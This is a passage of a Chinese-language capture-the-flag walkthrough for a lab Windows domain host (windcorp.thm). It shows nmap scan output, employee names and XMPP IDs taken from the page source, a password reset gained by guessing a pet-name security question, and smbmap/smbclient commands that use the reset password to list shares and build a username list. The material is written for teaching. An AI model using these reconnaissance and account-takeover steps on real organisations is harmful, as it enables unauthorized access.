&lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;</span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Fri, 08 Jul 2022 06:28:30 GMT</span><br><span class="hljs-string">|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT</span><br><span class="hljs-string">|     Content-Type: text/html</span><br><span class="hljs-string">|     Accept-Ranges: bytes</span><br><span class="hljs-string">|     Content-Length: 115</span><br><span class="hljs-string">|     &lt;html&gt;</span><br><span class="hljs-string">|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;</span><br><span class="hljs-string">|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;</span><br><span class="hljs-string">|     &lt;/head&gt;</span><br><span class="hljs-string">|     &lt;body&gt;</span><br><span class="hljs-string">|     &lt;/body&gt;</span><br><span class="hljs-string">|     &lt;/html&gt;</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Fri, 08 Jul 2022 06:28:32 GMT</span><br><span class="hljs-string">|     Allow: GET,HEAD,POST,OPTIONS</span><br><span class="hljs-string">|   Help: </span><br><span class="hljs-string">|     HTTP/1.1 400 No URI</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 49</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;</span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character OTEXT=0x80</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 71</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;</span><br><span class="hljs-string">|   RTSPRequest: </span><br><span class="hljs-string">|     HTTP/1.1 400 Unknown Version</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 58</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;</span><br><span class="hljs-string">|   SSLSessionReq: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x16</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 70</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">9389/tcp  open  mc-nmf              .NET Message Framing</span><br><span class="hljs-string">49670/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0</span><br><span class="hljs-string">49675/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">49676/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">49695/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">49922/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://google.com/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port5262-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE8D%P=x86_64-unknown-linux-g</span><br><span class="hljs-string">SF:nu%r(RPCCheck,9B,&quot;&lt;stream:error\x20xmlns:stream=\&quot;http://etherx\.jabber</span><br><span class="hljs-string">SF:\.org/streams\&quot;&gt;&lt;not-well-formed\x20xmlns=\&quot;urn:ietf:params:xml:ns:xmpp</span><br><span class="hljs-string">SF:-streams\&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;&quot;);</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port5275-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE8D%P=x86_64-unknown-linux-g</span><br><span class="hljs-string">SF:nu%r(RPCCheck,9B,&quot;&lt;stream:error\x20xmlns:stream=\&quot;http://etherx\.jabber</span><br><span class="hljs-string">SF:\.org/streams\&quot;&gt;&lt;not-well-formed\x20xmlns=\&quot;urn:ietf:params:xml:ns:xmpp</span><br><span class="hljs-string">SF:-streams\&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;&quot;);</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port9090-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE77%P=x86_64-unknown-linux-g</span><br><span class="hljs-string">SF:nu%r(GetRequest,11D,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20J</span><br><span class="hljs-string">SF:ul\x202022\x2006:28:07\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2</span><br><span class="hljs-string">SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges</span><br><span class="hljs-string">SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;&lt;/titl</span><br><span class="hljs-string">SF:e&gt;\n&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;URL=index\.jsp\&quot;&gt;\n&lt;</span><br><span class="hljs-string">SF:/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&quot;)%r(JavaRMI,C3,&quot;HTTP/1\.1\x20400\x</span><br><span class="hljs-string">SF:20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charse</span><br><span class="hljs-string">SF:t=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h</span><br><span class="hljs-string">SF:1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNT</span><br><span class="hljs-string">SF:L=0x0&lt;/pre&gt;&quot;)%r(WMSRequest,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character</span><br><span class="hljs-string">SF:\x20CNTL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten</span><br><span class="hljs-string">SF:t-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x2040</span><br><span class="hljs-string">SF:0&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x1&lt;/pre&gt;&quot;)%r(ibm-db</span><br><span class="hljs-string">SF:2-das,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nConte</span><br><span class="hljs-string">SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCo</span><br><span class="hljs-string">SF:nnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x2</span><br><span class="hljs-string">SF:0Illegal\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(SqueezeCenter_CLI,9B,&quot;HTTP/</span><br><span class="hljs-string">SF:1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859</span><br><span class="hljs-string">SF:-1\r\nContent-Length:\x2049\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20M</span><br><span class="hljs-string">SF:essage\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x20URI&lt;/pre&gt;&quot;)%r(informix,C3,&quot;HTTP</span><br><span class="hljs-string">SF:/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20te</span><br><span class="hljs-string">SF:xt/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20c</span><br><span class="hljs-string">SF:lose\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20ch</span><br><span class="hljs-string">SF:aracter\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(drda,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20c</span><br><span class="hljs-string">SF:haracter\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r</span><br><span class="hljs-string">SF:\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Messa</span><br><span class="hljs-string">SF:ge\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%</span><br><span class="hljs-string">SF:r(HTTPOptions,56,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\</span><br><span class="hljs-string">SF:x202022\x2006:28:16\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&quot;);</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port9091-TCP:V=7.92SVN%T=SSL%I=7%D=7/8%Time=62C7CE8F%P=x86_64-unknown-l</span><br><span class="hljs-string">SF:inux-gnu%r(GetRequest,11D,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x200</span><br><span class="hljs-string">SF:8\x20Jul\x202022\x2006:28:30\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20</span><br><span class="hljs-string">SF:Jan\x202020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-</span><br><span class="hljs-string">SF:Ranges:\x20bytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;</span><br><span class="hljs-string">SF:&lt;/title&gt;\n&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;URL=index\.jsp</span><br><span class="hljs-string">SF:\&quot;&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&quot;)%r(HTTPOptions,56,&quot;HTTP/1\.</span><br><span class="hljs-string">SF:1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2006:28:32\x20GMT</span><br><span class="hljs-string">SF:\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&quot;)%r(RTSPRequest,AD,&quot;HTTP/1\</span><br><span class="hljs-string">SF:.1\x20400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=i</span><br><span class="hljs-string">SF:so-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;B</span><br><span class="hljs-string">SF:ad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;/pre&gt;&quot;)%r(R</span><br><span class="hljs-string">SF:PCCheck,C7,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nC</span><br><span class="hljs-string">SF:ontent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r</span><br><span class="hljs-string">SF:\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason</span><br><span class="hljs-string">SF::\x20Illegal\x20character\x20OTEXT=0x80&lt;/pre&gt;&quot;)%r(DNSVersionBindReqTCP,</span><br><span class="hljs-string">SF:C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ</span><br><span class="hljs-string">SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti</span><br><span class="hljs-string">SF:on:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illeg</span><br><span class="hljs-string">SF:al\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(DNSStatusRequestTCP,C3,&quot;HTTP/1\.1</span><br><span class="hljs-string">SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht</span><br><span class="hljs-string">SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\</span><br><span class="hljs-string">SF:r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20charact</span><br><span class="hljs-string">SF:er\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(Help,9B,&quot;HTTP/1\.1\x20400\x20No\x20URI\r\nCont</span><br><span class="hljs-string">SF:ent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nC</span><br><span class="hljs-string">SF:onnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x</span><br><span class="hljs-string">SF:20No\x20URI&lt;/pre&gt;&quot;)%r(SSLSessionReq,C5,&quot;HTTP/1\.1\x20400\x20Illegal\x20</span><br><span class="hljs-string">SF:character\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1</span><br><span class="hljs-string">SF:\r\nContent-Length:\x2070\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Mes</span><br><span class="hljs-string">SF:sage\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x16&lt;/pre&gt;</span><br><span class="hljs-string">SF:&quot;);</span><br><span class="hljs-string">Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2022-07-08T06:29:07</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   311: </span><br><span class="hljs-string">|_    Message signing enabled and required</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="hljs-string"># Nmap done at Fri Jul  8 14:30:06 2022 -- 1 IP address (1 host up) scanned in 657.96 seconds</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="Flag1-txt"><a href="#Flag1-txt" class="headerlink" title="Flag1.txt:"></a>Flag1.txt:</h6><img src="https://www.worldisend.com/img/image-20220708143519611.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220708143519611" style="zoom:200%;" />
+
+<p>Windows server. IIS.右键查看源代码会发现以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=organicfish718@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:organicfish718@fire.windcorp.thm&quot;</span>&gt;</span>Antonietta Vidal<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=organicwolf509@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:organicwolf509@fire.windcorp.thm&quot;</span>&gt;</span>Britney Palmer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=tinywolf424@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:tinywolf424@fire.windcorp.thm&quot;</span>&gt;</span>Brittany Cruz<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=angrybird253@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:angrybird253@fire.windcorp.thm&quot;</span>&gt;</span>Carla Meyer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=buse@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:buse@fire.windcorp.thm&quot;</span>&gt;</span>Buse Candan<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Edeltraut@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:Edeltraut@fire.windcorp.thm&quot;</span>&gt;</span> Edeltraut Daub<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Edward@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:Edward@fire.windcorp.thm&quot;</span>&gt;</span> Edward Lewis<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Emile@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:Emile@fire.windcorp.thm&quot;</span>&gt;</span> Emile Lavoie<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=tinygoose102@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:tinygoose102@fire.windcorp.thm&quot;</span>&gt;</span> Emile Henry<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=brownostrich284@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:brownostrich284@fire.windcorp.thm&quot;</span>&gt;</span> Emily Anderson<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=sadswan869@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:sadswan869@fire.windcorp.thm&quot;</span>&gt;</span> Hemmo Boschma<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=goldencat416@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:sadswan869@fire.windcorp.thm&quot;</span>&gt;</span> Isabella Hughes<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=whiteleopard529@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:whiteleopard529@fire.windcorp.thm&quot;</span>&gt;</span> Isra Saur<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=happymeercat399@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:happymeercat399@fire.windcorp.thm&quot;</span>&gt;</span> Jackson Vasquez<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=orangegorilla428@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:orangegorilla428@fire.windcorp.thm&quot;</span>&gt;</span> Jaqueline Dittmer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>看起来目标URL地址就是windcorp.thm。</p>
+<p><img src="https://www.worldisend.com/img/image-20220708144408730.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220708144408730"></p>
+<p>三个用户名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Emily Jensen<br>Lily Levesque<br>Kirk Uglas<br></code></pre></td></tr></table></figure>
+
+<p>或许目标内部员工有把对应图像文件名当成用户名的习惯，所以其图像名称获取能为真正用户名猜想做一些参考。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://windcorp.thm/img/Emilieje.jpg<br>http://windcorp.thm/img/lilyleAndSparky.jpg<br>http://windcorp.thm/img/kirkug.jpg<br></code></pre></td></tr></table></figure>
+
+<p>Lily Levesque的文件中有一个And链接了另一个名称Sparky。谁是Sparky，抱的这只宠物狗？</p>
+<p><img src="https://www.worldisend.com/img/image-20220708150128234.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220708150128234"></p>
+<p>在右上角重置密码中，能看到其中一个问题是最喜欢的宠物，输入后会重置密码为：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ChangeMe<span class="hljs-meta">#1234</span><br></code></pre></td></tr></table></figure>
+
+<p>并提醒记得登录后修改。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">export</span> TIP=10.10.121.103<br>$ smbmap -H <span class="hljs-variable">$TIP</span> -u lilyle -p ChangeMe<span class="hljs-comment">#1234</span><br>[+] IP: 10.10.121.103:445	Name: windcorp.thm                                      <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	ADMIN$                                            	NO ACCESS	Remote Admin<br>	C$                                                	NO ACCESS	Default share<br>	IPC$                                              	READ ONLY	Remote IPC<br>	NETLOGON                                          	READ ONLY	Logon server share <br>	Shared                                            	READ ONLY	<br>	SYSVOL                                            	READ ONLY	Logon server share <br>	Users                                             	READ ONLY	<br></code></pre></td></tr></table></figure>
+
+<p>Users中会有很多用户名，可以被用来制作用户名字典。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //<span class="hljs-variable">$TIP</span>/Users -U lilyle -c <span class="hljs-built_in">ls</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; user<br>$ <span class="hljs-built_in">cat</span> user<br>Administrator<br>angrybird<br>berg<br>bluefrog579<br>brittanycr<br>brownostrich284<br>buse<br>edward<br>freddy<br>garys<br>goldencat416<br>goldenwol<br>happ<br>happyme<br>Luis<br>orga<br>organicf<br>organicfish718<br>pete<br>Public<br>purplecat<br>purplepanda<br>sadswan<br>sadswan869<br>sheela<br>silver<br>smallf<br>spiff<br>tinygoos<br>whiteleopard<br></code></pre></td></tr></table></figure>
+
